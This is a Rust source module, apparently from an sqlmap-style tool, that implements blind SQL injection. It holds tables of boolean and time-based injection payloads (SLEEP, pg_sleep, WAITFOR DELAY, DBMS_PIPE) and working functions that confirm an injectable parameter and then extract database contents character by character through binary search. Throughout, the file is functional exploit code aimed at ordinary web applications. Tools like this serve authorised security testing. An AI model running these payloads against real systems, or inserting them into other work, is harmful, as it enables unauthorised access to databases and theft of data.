//! Blind SQL injection inference

use crate::sqli::core::{DBMS, CHAR_START, CHAR_STOP};
use crate::sqli::request::{Request, page_ratio, remove_dynamic_content};
use anyhow::Result;
use std::time::{Duration, Instant};

/// Minimum gap between the TRUE-condition and FALSE-condition similarity ratios
/// required to confirm a boolean differential. This relative margin is far more
/// robust on dynamic pages than fixed absolute thresholds alone.
const BOOL_DIFFERENTIAL_MARGIN: f64 = 0.25;

/// Blind injection vector
#[derive(Debug, Clone)]
pub struct BlindVector {
    pub dbms: DBMS,
    pub prefix: String,
    pub suffix: String,
    pub true_code: String,    // Payload that returns true
    pub false_code: String,   // Payload that returns false
    pub time_based: bool,     // Use time-based instead of boolean
    pub delay: u64,           // Delay in seconds for time-based
}

/// A boolean-blind boundary to probe: (prefix, suffix, true_code, false_code,
/// true_payload, false_payload). Table-driven so the full boundary matrix (paren,
/// comment and quote variants) can be expanded here without touching the logic.
struct BoolBoundary {
    prefix: &'static str,
    suffix: &'static str,
    true_code: &'static str,
    false_code: &'static str,
    true_payload: &'static str,
    false_payload: &'static str,
}

// Boundary matrix modelled on sqlmap's boundaries: numeric, single-quote,
// double-quote and parenthesised contexts, each terminated by a comment so the
// trailing application syntax is neutralised (these are extraction-safe). The
// paired-quote variants (no comment) are kept last as detection-only fallbacks.
const BOOL_BOUNDARIES: &[BoolBoundary] = &[
    // Numeric context
    BoolBoundary { prefix: "1", suffix: "-- -", true_code: "AND 1=1", false_code: "AND 1=2",
        true_payload: "1 AND 1=1-- -", false_payload: "1 AND 1=2-- -" },
    BoolBoundary { prefix: "1", suffix: "#", true_code: "AND 1=1", false_code: "AND 1=2",
        true_payload: "1 AND 1=1#", false_payload: "1 AND 1=2#" },
    // Single-quote string context
    BoolBoundary { prefix: "1'", suffix: "-- -", true_code: "AND 1=1", false_code: "AND 1=2",
        true_payload: "1' AND 1=1-- -", false_payload: "1' AND 1=2-- -" },
    BoolBoundary { prefix: "1'", suffix: "#", true_code: "AND 1=1", false_code: "AND 1=2",
        true_payload: "1' AND 1=1#", false_payload: "1' AND 1=2#" },
    // Double-quote string context
    BoolBoundary { prefix: "1\"", suffix: "-- -", true_code: "AND 1=1", false_code: "AND 1=2",
        true_payload: "1\" AND 1=1-- -", false_payload: "1\" AND 1=2-- -" },
    // Parenthesised numeric context
    BoolBoundary { prefix: "1)", suffix: "-- -", true_code: "AND (1=1)", false_code: "AND (1=2)",
        true_payload: "1) AND (1=1)-- -", false_payload: "1) AND (1=2)-- -" },
    // Parenthesised single-quote context
    BoolBoundary { prefix: "1')", suffix: "-- -", true_code: "AND (1=1)", false_code: "AND (1=2)",
        true_payload: "1') AND (1=1)-- -", false_payload: "1') AND (1=2)-- -" },
    // Double-parenthesised single-quote context
    BoolBoundary { prefix: "1'))", suffix: "-- -", true_code: "AND ((1=1))", false_code: "AND ((1=2))",
        true_payload: "1')) AND ((1=1))-- -", false_payload: "1')) AND ((1=2))-- -" },
    // Paired-quote fallbacks (detection-only; no comment terminator)
    BoolBoundary { prefix: "1'", suffix: "", true_code: "AND '1'='1", false_code: "AND '1'='2",
        true_payload: "1' AND '1'='1", false_payload: "1' AND '1'='2" },
    BoolBoundary { prefix: "1\"", suffix: "", true_code: "AND \"1\"=\"1", false_code: "AND \"1\"=\"2",
        true_payload: "1\" AND \"1\"=\"1", false_payload: "1\" AND \"1\"=\"2" },
];

/// Check if target is vulnerable to boolean-based blind SQLi.
///
/// Robustness improvements over the original fixed-threshold check:
///  - dynamic content (timestamps, CSRF tokens, session IDs) is stripped before
///    comparison via `remove_dynamic_content` (previously written but unused);
///  - detection requires a wide *differential* between the TRUE and FALSE
///    similarity ratios, not just absolute thresholds, which holds up on pages
///    with naturally varying content.
pub async fn check_boolean_blind(request: &Request<'_>) -> Result<Option<BlindVector>> {
    let baseline = remove_dynamic_content(&request.query_page("1").await?);

    for boundary in BOOL_BOUNDARIES {
        let true_page = remove_dynamic_content(&request.query_page(boundary.true_payload).await?);
        let false_page = remove_dynamic_content(&request.query_page(boundary.false_payload).await?);
        let true_ratio = page_ratio(&true_page, &baseline);
        let false_ratio = page_ratio(&false_page, &baseline);

        // Confirm a boolean differential: the TRUE page closely matches the
        // baseline, the FALSE page diverges, AND the gap between them is wide
        // enough to rule out page noise.
        if true_ratio > 0.9
            && false_ratio < 0.6
            && (true_ratio - false_ratio) > BOOL_DIFFERENTIAL_MARGIN
        {
            return Ok(Some(BlindVector {
                dbms: DBMS::Unknown,
                prefix: boundary.prefix.to_string(),
                suffix: boundary.suffix.to_string(),
                true_code: boundary.true_code.to_string(),
                false_code: boundary.false_code.to_string(),
                time_based: false,
                delay: 0,
            }));
        }
    }

    Ok(None)
}

/// Check if target is vulnerable to time-based blind SQLi
/// Number of seconds each time-based payload should delay the response.
const TIME_DELAY: u64 = 5;

/// A time-based probe: a DBMS-specific payload that sleeps `TIME_DELAY` seconds.
struct TimeProbe {
    dbms: DBMS,
    prefix: &'static str,
    suffix: &'static str,
    true_code: &'static str,
    payload: &'static str,
}

const TIME_PROBES: &[TimeProbe] = &[
    // MySQL / MariaDB
    TimeProbe { dbms: DBMS::MySQL, prefix: "1", suffix: "-- -",
        true_code: "AND SLEEP(5)", payload: "1 AND SLEEP(5)-- -" },
    TimeProbe { dbms: DBMS::MySQL, prefix: "1'", suffix: "-- -",
        true_code: "AND SLEEP(5)", payload: "1' AND SLEEP(5)-- -" },
    // PostgreSQL
    TimeProbe { dbms: DBMS::PostgreSQL, prefix: "1", suffix: "-- -",
        true_code: "AND (SELECT 1 FROM pg_sleep(5))", payload: "1 AND (SELECT 1 FROM pg_sleep(5))-- -" },
    TimeProbe { dbms: DBMS::PostgreSQL, prefix: "1'", suffix: "-- -",
        true_code: "AND (SELECT 1 FROM pg_sleep(5))", payload: "1' AND (SELECT 1 FROM pg_sleep(5))-- -" },
    // Microsoft SQL Server (stacked WAITFOR)
    TimeProbe { dbms: DBMS::MSSQL, prefix: "1", suffix: "-- -",
        true_code: "; WAITFOR DELAY '0:0:5'", payload: "1; WAITFOR DELAY '0:0:5'-- -" },
    TimeProbe { dbms: DBMS::MSSQL, prefix: "1'", suffix: "-- -",
        true_code: "'; WAITFOR DELAY '0:0:5'", payload: "1'; WAITFOR DELAY '0:0:5'-- -" },
    // Oracle
    TimeProbe { dbms: DBMS::Oracle, prefix: "1", suffix: "-- -",
        true_code: "AND 1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)",
        payload: "1 AND 1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- -" },
    TimeProbe { dbms: DBMS::Oracle, prefix: "1'", suffix: "-- -",
        true_code: "AND 1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)",
        payload: "1' AND 1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- -" },
];

/// Check if the target is vulnerable to time-based blind SQLi.
///
/// Hardened over the original single-sample MySQL/PostgreSQL check:
///  - establishes a stable baseline from the median of several samples;
///  - covers MySQL, PostgreSQL, MSSQL (WAITFOR) and Oracle (DBMS_PIPE);
///  - requires a *confirmatory* second delayed response before reporting, which
///    rules out one-off network jitter.
pub async fn check_time_blind(request: &Request<'_>) -> Result<Option<BlindVector>> {
    // Baseline: median of a few quick samples to absorb jitter.
    let mut samples = Vec::new();
    for _ in 0..3 {
        let start = Instant::now();
        let _ = request.query_page("1").await?;
        samples.push(start.elapsed());
    }
    samples.sort();
    let normal_time = samples[samples.len() / 2];

    // A genuine delay must clear (DELAY - 1)s and be well above baseline.
    let threshold = Duration::from_secs(TIME_DELAY - 1).max(normal_time * 3);

    for probe in TIME_PROBES {
        let start = Instant::now();
        let _ = request.query_page(probe.payload).await?;
        if start.elapsed() < threshold {
            continue;
        }

        // Confirm with a second request to rule out a transient slow response.
        let start = Instant::now();
        let _ = request.query_page(probe.payload).await?;
        if start.elapsed() < threshold {
            continue;
        }

        return Ok(Some(BlindVector {
            dbms: probe.dbms,
            prefix: probe.prefix.to_string(),
            suffix: probe.suffix.to_string(),
            true_code: probe.true_code.to_string(),
            false_code: "AND 1=1".to_string(),
            time_based: true,
            delay: TIME_DELAY,
        }));
    }

    Ok(None)
}

/// Extract a single character using boolean-based blind
pub async fn extract_char_boolean(
    request: &Request<'_>,
    vector: &BlindVector,
    expression: &str,
    position: usize,
    baseline: &str,
) -> Result<Option<char>> {
    // Binary search for character ASCII value
    let mut low = 32u8;
    let mut high = 126u8;
    
    while low <= high {
        let mid = (low + high) / 2;
        
        let payload = match vector.dbms {
            DBMS::MySQL | DBMS::Unknown => {
                format!("{} AND ASCII(SUBSTRING(({}),{},1))>{}{}",
                    vector.prefix, expression, position, mid, vector.suffix)
            },
            DBMS::PostgreSQL => {
                format!("{} AND ASCII(SUBSTRING(({}),{},1))>{}{}",
                    vector.prefix, expression, position, mid, vector.suffix)
            },
            DBMS::MSSQL => {
                format!("{} AND ASCII(SUBSTRING(({}),{},1))>{}{}",
                    vector.prefix, expression, position, mid, vector.suffix)
            },
            _ => {
                format!("{} AND ASCII(SUBSTR(({}),{},1))>{}{}",
                    vector.prefix, expression, position, mid, vector.suffix)
            }
        };
        
        let page = request.query_page(&payload).await?;
        let ratio = page_ratio(&page, baseline);
        
        if ratio > 0.9 {
            // True condition - character is greater than mid
            low = mid + 1;
        } else {
            // False condition - character is less than or equal to mid
            high = mid - 1;
        }
    }
    
    if low >= 32 && low <= 126 {
        Ok(Some(low as char))
    } else {
        Ok(None)
    }
}

/// Extract a single character using time-based blind
pub async fn extract_char_time(
    request: &Request<'_>,
    vector: &BlindVector,
    expression: &str,
    position: usize,
) -> Result<Option<char>> {
    let delay = vector.delay;
    let mut low = 32u8;
    let mut high = 126u8;
    
    while low <= high {
        let mid = (low + high) / 2;
        
        let payload = match vector.dbms {
            DBMS::MySQL => {
                format!("{} AND IF(ASCII(SUBSTRING(({}),{},1))>{},SLEEP({}),0){}",
                    vector.prefix, expression, position, mid, delay, vector.suffix)
            },
            DBMS::PostgreSQL => {
                format!("{} AND (SELECT CASE WHEN ASCII(SUBSTRING(({}),{},1))>{} THEN pg_sleep({}) ELSE pg_sleep(0) END){}",
                    vector.prefix, expression, position, mid, delay, vector.suffix)
            },
            _ => {
                format!("{} AND IF(ASCII(SUBSTRING(({}),{},1))>{},SLEEP({}),0){}",
                    vector.prefix, expression, position, mid, delay, vector.suffix)
            }
        };
        
        let start = Instant::now();
        let _ = request.query_page(&payload).await?;
        let elapsed = start.elapsed();
        
        if elapsed > Duration::from_secs(delay - 1) {
            // True condition - character is greater than mid
            low = mid + 1;
        } else {
            // False condition - character is less than or equal to mid
            high = mid - 1;
        }
    }
    
    if low >= 32 && low <= 126 {
        Ok(Some(low as char))
    } else {
        Ok(None)
    }
}

/// Extract full string using blind injection
pub async fn extract_string(
    request: &Request<'_>,
    vector: &BlindVector,
    expression: &str,
    max_length: usize,
) -> Result<String> {
    let baseline = request.query_page(&format!("{} {}", vector.prefix, vector.true_code)).await?;
    let mut result = String::new();
    
    for pos in 1..=max_length {
        let char = if vector.time_based {
            extract_char_time(request, vector, expression, pos).await?
        } else {
            extract_char_boolean(request, vector, expression, pos, &baseline).await?
        };
        
        match char {
            Some(c) if c != ' ' || !result.is_empty() => {
                result.push(c);
                tracing::debug!("Extracted character {}: '{}'", pos, c);
            },
            _ => break, // End of string
        }
    }
    
    Ok(result.trim().to_string())
}

/// Get length of expression result
pub async fn get_length(
    request: &Request<'_>,
    vector: &BlindVector,
    expression: &str,
) -> Result<usize> {
    let baseline = request.query_page(&format!("{} {}", vector.prefix, vector.true_code)).await?;
    
    // Binary search for length
    let mut low = 0usize;
    let mut high = 1000usize;
    
    while low < high {
        let mid = (low + high + 1) / 2;
        
        let payload = match vector.dbms {
            DBMS::MySQL | DBMS::Unknown => {
                format!("{} AND LENGTH(({}))>={}{}",
                    vector.prefix, expression, mid, vector.suffix)
            },
            DBMS::PostgreSQL => {
                format!("{} AND LENGTH(({}))>={}{}",
                    vector.prefix, expression, mid, vector.suffix)
            },
            _ => {
                format!("{} AND LENGTH(({}))>={}{}",
                    vector.prefix, expression, mid, vector.suffix)
            }
        };
        
        let page = request.query_page(&payload).await?;
        let ratio = page_ratio(&page, &baseline);
        
        if ratio > 0.9 {
            low = mid;
        } else {
            high = mid - 1;
        }
    }
    
    Ok(low)
}
